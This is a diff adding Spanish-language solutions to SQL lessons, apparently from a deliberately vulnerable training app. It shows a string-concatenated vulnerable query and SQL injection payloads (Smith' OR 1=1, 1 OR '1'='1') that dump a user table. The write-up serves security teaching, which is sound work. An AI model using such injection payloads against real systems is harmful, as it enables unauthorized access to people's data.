@@ -69,7 +69,7 @@ Para completar el ejercicio debemos ingresar el siguiente comando SQL:
 ALTER TABLE employees ADD phone varchar(20)
 ```
 
-Lesson 5
+## Lesson 5
 
 ### Desarrollo
 
@@ -99,3 +99,43 @@ GRANT SELECT ON grant_rigths TO unauthorized_user
 
 ### Desarrollo
 
+Debemos acceder a la información de la tabla de usuarios seleccionando las opciones correctas para completar la consulta SQL inyectada.
+
+La sentencia SQL original es la siguiente:
+
+```sql
+"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";
+```
+
+### Solución
+
+Para completar el ejercicio debemos seleccionar las siguientes opciones:
+
+- `Smith'`
+- `OR`
+- `1=1`
+
+De esta forma, la consulta SQL inyectada sería:
+
+```sql
+SELECT * FROM user_data WHERE last_name='Smith' OR 1=1
+```
+
+
+## Lesson 10
+
+### Desarrollo
+
+Debemos acceder a la información de la tabla de usuarios.
+
+Tenemos disponibles dos inputs de texto, uno para `Login_Count` y otro para `User_Id`.
+
+### Solución
+
+Para completar el ejercicio debemos ingresar `1` o cualquier otro valor en el campo `Login_Count` y `1 OR '1'='1'` en el campo `User_Id`.
+
+De esta forma, la consulta SQL inyectada sería:
+
+```sql
+SELECT * FROM user_data WHERE Login_Count=1 OR '1'='1'
+```
